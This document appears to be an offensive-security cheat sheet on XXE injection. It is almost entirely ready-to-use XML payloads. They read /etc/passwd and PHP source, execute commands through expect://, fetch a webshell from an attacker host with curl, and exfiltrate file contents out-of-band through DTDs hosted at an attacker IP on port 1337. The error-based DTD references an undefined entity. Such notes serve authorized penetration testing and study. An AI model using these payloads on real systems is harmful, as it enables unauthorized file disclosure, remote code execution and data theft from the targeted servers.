# XXE

## Tips
- Check if there are requests sending XML to the backend, ideally where the backend doesn't sanitise
- Check if some fields from the xml are displayed on the page to inject into
- Check if changing the content-type to `application/xml` works ([json2xml](https://www.convertjson.com/json-to-xml.htm))

### Detection
Check if you can read a variable from a DDT definition
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe "vulnerable">
]>
&xxe;
```

### Basic file read
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### Read PHP files
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### RCE
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```
#### Inject a webshell
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'<ip>/shelle.php'">
]>
```

#### CDATA exfiltration
Host this snippet in a file on a http server
```xml
<!ENTITY joined "%begin;%file;%end;">
```
```xml
<!DOCTYPE somefield [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://<attacker-ip>:1337/joined.dtd">
  %xxe;
]>
```
```xml
<somefield>&joined;</somefield>
```

#### Error based
 - Check if sending malformed data triggers useful error messages

Host a DTD file containing something like this
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%whatever;/%file;'>">
```

Then reference it
```xml
<!DOCTYPE somefield [ 
  <!ENTITY % xxe SYSTEM "http://<attacker-ip>:1337/error.dtd">
  %xxe;
  %error;
]>
```